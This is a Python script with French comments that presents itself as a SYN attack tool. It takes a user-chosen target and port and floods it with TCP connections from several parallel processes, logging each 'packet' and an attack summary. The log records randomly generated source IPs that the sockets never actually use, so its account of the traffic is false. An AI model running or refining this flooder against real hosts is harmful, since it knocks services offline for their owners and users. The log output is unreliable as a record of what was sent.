import socket
import multiprocessing
import time
from modules.demande_user import DemandeUtilisateur
from modules.journal import Journal
from modules.ip_aleatoire import generer_ip_sources
from multiprocessing import  Value

total_paquets_envoyes = Value('i', 0)  # Création d'une valeur partagée pour compter les paquets envoyés sinon bug dans le code

class EnvoiPaquet:
   
    def envois(cible, port, nbrpaquet, results):
        messages = [] # Initialisation de la liste pour stocker les messages
        segment_size = nbrpaquet // 10 #Calcul de la taille du segment pour afficher la progression
        paquets_envoyes = 0 #Initialisation du compteur de paquets envoyés
        
        for i in range(nbrpaquet):
            ip_source = generer_ip_sources() # appel la generation d'adresse IP 
            message = f"Paquet envoyé - IP source: {ip_source}, Port: {port}, Destination: {cible}, Protocole: TCP"
            ip = socket.gethostbyname(cible) 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Création d'un socket TCP
            s.connect((ip, port)) # Connexion au socket
            try:
                s.sendall(b"Data to send") # envois des données
                messages.append(message) # ajoute le message pour pouvoir le recupere et le journalisé
                paquets_envoyes += 1 # incréamentation pour ne perdre aucune données 
                with total_paquets_envoyes.get_lock(): # verrou car valeur partager par plusieurs processus. permet avoir un résultat plus proche de la demande, sinon perte de paquet sur 10000 on peut en perdre 500 
                    total_paquets_envoyes.value += 1  # Incrémenter le nombre total de paquets envoyés
            except socket.error as e:
                print(e) # affiche erreur
            finally:
                s.close() #fermeture du socket quand envois est fini.
            
            if paquets_envoyes % segment_size == 0:
                pourcentage_progression = (paquets_envoyes / nbrpaquet) * 100 # Calcul du pourcentage de progression
                print(f"On est à {pourcentage_progression:.0f}%", end="\r") # Affichage de la progression
        
        results.extend(messages)

class Journalisation:

    
    def journaliser(cible, port, nbrpaquet, nbr_processus, messages):# Définition de la méthode journaliser de la classe Journalisation
        journal = Journal()
        journal.log_demande(cible, port, nbrpaquet, nbr_processus) # Appel de la méthode log_demande pour enregistrer les informations de la demande
        journal.log_recap_attaque(cible, port, nbrpaquet, nbr_processus, messages) # Appel de la méthode log_recap_attaque pour enregistrer le récapitulatif de l'attaque


def syn(cible, port, nbrpaquet, nbr_processus): # Définition de la fonction syn pour lancer l'attaque SYN
    debut_execution = time.time() # Enregistrement du temps de début d'exécution pour calculé le temps execution
    packets_per_process = nbrpaquet // nbr_processus # Calcul du nombre de paquets par processus
    results = multiprocessing.Manager().list()
    processes = []

    for _ in range(nbr_processus):  # Boucle pour créer et démarrer les processus
        p = multiprocessing.Process(target=EnvoiPaquet.envois, args=(cible, port, packets_per_process, results)) # création processus
        processes.append(p) 
        p.start() # demarrage du processus

    for p in processes: 
        p.join()

    temps_execution = round(time.time() - debut_execution, 2)

    print(f"Temps d'exécution total : {temps_execution} secondes")
    print(f"Total de paquets envoyés : {total_paquets_envoyes.value}")
    Journalisation.journaliser(cible, port, nbrpaquet, nbr_processus, results)   # Appel de la méthode journaliser pour enregistrer les informations de l'attaque

if __name__ == "__main__":
    demande_utilisateur = DemandeUtilisateur()
    cible, port, nbrpaquet, nbr_processus = demande_utilisateur.obtenir_informations()  # Récupération des informations saisies par l'utilisateur
    syn(cible, port, nbrpaquet, nbr_processus) # Lancement de l'attaque SYN
